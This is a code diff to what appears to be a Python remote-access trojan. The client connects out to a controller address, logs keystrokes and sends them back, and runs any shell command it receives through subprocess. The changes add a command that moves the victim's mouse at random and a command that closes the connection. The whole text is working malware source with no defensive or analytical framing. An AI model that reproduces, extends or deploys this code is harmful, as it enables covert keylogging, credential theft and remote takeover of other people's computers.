@@ -14,7 +14,7 @@ kloutput = []
 line = ""
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect = client.connect_ex(ADDR)
+client.connect(ADDR)
 
 
 def log_keystroke(key):
@@ -33,6 +33,13 @@ def log_keystroke(key):
         if key:
             kloutput.append(key)
         output = "<kl>" + str(kloutput)
+
+
+def random_mouse():
+    for z in range(1, 10):
+        x = random.randint(0, 1000)
+        y = random.randint(0, 1000)
+        pyautogui.moveTo(x, y)
 
 
 def send(msg):
@@ -61,7 +68,6 @@ while True:
                     output = os.getcwd()
             except FileNotFoundError as e:
                 output = e
-
         if "kl" in command.split():
             try:
                 if len(command.split()) == 2:
@@ -74,6 +80,10 @@ while True:
                     l.join()
             except ValueError as e:
                 output = e
+        if "rm" in command.split():
+            random_mouse()
+        if "close" in command.split():
+            client.close()
         else:
             output = subprocess.getoutput(command)
             if not output:
